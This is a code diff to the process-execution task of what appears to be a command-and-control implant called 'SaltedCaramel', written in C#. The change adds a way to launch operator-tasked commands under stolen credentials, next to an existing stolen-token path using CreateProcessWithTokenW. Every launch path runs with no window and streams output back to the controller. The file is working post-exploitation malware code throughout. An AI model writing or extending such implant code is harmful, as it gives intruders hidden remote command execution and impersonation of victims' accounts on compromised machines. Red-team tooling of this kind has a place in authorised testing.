@@ -6,6 +6,7 @@ using System.IO;
 using System.IO.Pipes;
 using System.Linq;
 using System.Runtime.InteropServices;
+using System.Security;
 using System.Security.AccessControl;
 using System.Threading;
 
@@ -18,9 +19,141 @@ namespace SaltedCaramel.Tasks
         public static void Execute(SCTask task, SCImplant implant)
         {
             if (implant.HasAlternateToken() == true)
-                StartProcessWithToken(task, implant, Token.stolenHandle);
+                StartProcessWithToken(task, implant);
+            else if (implant.HasCredentials() == true)
+                StartProcessWithCredentials(task, implant);
             else
-               StartProcess(task, implant);
+                StartProcess(task, implant);
+        }
+
+        /// <summary>
+        /// Start a process using System.Diagnostics.Process
+        /// If we don't have to worry about a stolen token we can just start a process normally
+        /// </summary>
+        /// <param name="task"></param>
+        /// <param name="implant"></param>
+        public static void StartProcess (SCTask task, SCImplant implant)
+        {
+            string[] split = task.@params.Trim().Split(' ');
+            string argString = string.Join(" ", split.Skip(1).ToArray());
+            ProcessStartInfo startInfo = new ProcessStartInfo
+            {
+                FileName = split[0],
+                Arguments = argString,
+                UseShellExecute = false,
+                RedirectStandardOutput = true, // Ensure we get standard output
+                CreateNoWindow = true // Don't create a new window
+            };
+
+            using (Process proc = new Process())
+            {
+                proc.StartInfo = startInfo;
+
+                try
+                {
+                    Debug.WriteLine("[-] DispatchTask -> StartProcess - Tasked to start process " + startInfo.FileName);
+                    proc.Start();
+
+                    List<string> procOutput = new List<string>();
+                    SCTaskResp response;
+
+                    while (!proc.StandardOutput.EndOfStream)
+                    {
+                        string line = proc.StandardOutput.ReadLine();
+                        procOutput.Add(line);
+                        if (procOutput.Count >= 5)
+                        {
+                            response = new SCTaskResp(task.id, JsonConvert.SerializeObject(procOutput));
+                            implant.PostResponse(response);
+                            procOutput.Clear();
+                        }
+                    }
+
+                    proc.WaitForExit();
+                    task.status = "complete";
+                    task.message = JsonConvert.SerializeObject(procOutput);
+                }
+                catch (Exception e)
+                {
+                    Debug.WriteLine("[!] DispatchTask -> StartProcess - ERROR starting process: " + e.Message);
+                    task.status = "error";
+                    task.message = e.Message;
+                }
+            }
+        }
+
+        /// <summary>
+        /// Start a process using explicit credentials
+        /// </summary>
+        /// <param name="task"></param>
+        /// <param name="implant"></param>
+        /// <param name="Credentials"></param>
+        public static void StartProcessWithCredentials(SCTask task, SCImplant implant)
+        {
+            string user;
+            string domain;
+            if (Token.Credentials.Key.Contains("\\"))
+            {
+                domain = Token.Credentials.Key.Split('\\')[0];
+                user = Token.Credentials.Key.Split('\\')[1];
+            }
+            else
+            {
+                domain = ".";
+                user = Token.Credentials.Key;
+            }
+            SecureString pass = Token.Credentials.Value;
+
+            string[] split = task.@params.Trim().Split(' ');
+            string argString = string.Join(" ", split.Skip(1).ToArray());
+            ProcessStartInfo startInfo = new ProcessStartInfo
+            {
+                FileName = split[0],
+                Arguments = argString,
+                WorkingDirectory = "C:\\Temp",
+                UseShellExecute = false,
+                RedirectStandardOutput = true, // Ensure we get standard output
+                CreateNoWindow = true, // Don't create a new window
+                Domain = domain,
+                UserName = user,
+                Password = pass
+            };
+
+            using (Process proc = new Process())
+            {
+                proc.StartInfo = startInfo;
+
+                try
+                {
+                    Debug.WriteLine("[-] DispatchTask -> StartProcessWithCredentials - Tasked to start process " + startInfo.FileName);
+                    proc.Start();
+
+                    List<string> procOutput = new List<string>();
+                    SCTaskResp response;
+
+                    while (!proc.StandardOutput.EndOfStream)
+                    {
+                        string line = proc.StandardOutput.ReadLine();
+                        procOutput.Add(line);
+                        if (procOutput.Count >= 5)
+                        {
+                            response = new SCTaskResp(task.id, JsonConvert.SerializeObject(procOutput));
+                            implant.PostResponse(response);
+                            procOutput.Clear();
+                        }
+                    }
+
+                    proc.WaitForExit();
+                    task.status = "complete";
+                    task.message = JsonConvert.SerializeObject(procOutput);
+                }
+                catch (Exception e)
+                {
+                    Debug.WriteLine("[!] DispatchTask -> StartProcess - ERROR starting process: " + e.Message);
+                    task.status = "error";
+                    task.message = e.Message;
+                }
+            }
         }
 
         /// <summary>
@@ -30,7 +163,7 @@ namespace SaltedCaramel.Tasks
         /// <param name="task"></param>
         /// <param name="implant"></param>
         /// <param name="TokenHandle"></param>
-        public static void StartProcessWithToken(SCTask task, SCImplant implant, IntPtr TokenHandle)
+        public static void StartProcessWithToken(SCTask task, SCImplant implant)
         {
             string[] split;
             string argString;
@@ -77,7 +210,7 @@ namespace SaltedCaramel.Tasks
 
                     // Finally, create our new process
                     bool createProcess = Win32.Advapi32.CreateProcessWithTokenW(
-                        TokenHandle,            // hToken
+                        Token.stolenHandle,     // hToken
                         IntPtr.Zero,            // dwLogonFlags
                         null,                   // lpApplicationName
                         file + " " + argString, // lpCommandLineName
@@ -187,62 +320,6 @@ namespace SaltedCaramel.Tasks
                 {
                     pipeClient.Close();
                     pipeServer.Close();
-                    task.status = "error";
-                    task.message = e.Message;
-                }
-            }
-        }
-
-        /// <summary>
-        /// Start a process using System.Diagnostics.Process
-        /// If we don't have to worry about a stolen token we can just start a process normally
-        /// </summary>
-        /// <param name="task"></param>
-        /// <param name="implant"></param>
-        public static void StartProcess (SCTask task, SCImplant implant)
-        {
-            string[] split = task.@params.Trim().Split(' ');
-            string argString = string.Join(" ", split.Skip(1).ToArray());
-            ProcessStartInfo startInfo = new ProcessStartInfo
-            {
-                FileName = split[0],
-                Arguments = argString,
-                UseShellExecute = false,
-                RedirectStandardOutput = true, // Ensure we get standard output
-                CreateNoWindow = true // Don't create a new window
-            };
-
-            using (Process proc = new Process())
-            {
-                proc.StartInfo = startInfo;
-
-                try
-                {
-                    Debug.WriteLine("[-] DispatchTask -> StartProcess - Tasked to start process " + startInfo.FileName);
-                    proc.Start();
-
-                    List<string> procOutput = new List<string>();
-                    SCTaskResp response;
-
-                    while (!proc.StandardOutput.EndOfStream)
-                    {
-                        string line = proc.StandardOutput.ReadLine();
-                        procOutput.Add(line);
-                        if (procOutput.Count >= 5)
-                        {
-                            response = new SCTaskResp(task.id, JsonConvert.SerializeObject(procOutput));
-                            implant.PostResponse(response);
-                            procOutput.Clear();
-                        }
-                    }
-
-                    proc.WaitForExit();
-                    task.status = "complete";
-                    task.message = JsonConvert.SerializeObject(procOutput);
-                }
-                catch (Exception e)
-                {
-                    Debug.WriteLine("[!] DispatchTask -> StartProcess - ERROR starting process: " + e.Message);
                     task.status = "error";
                     task.message = e.Message;
                 }
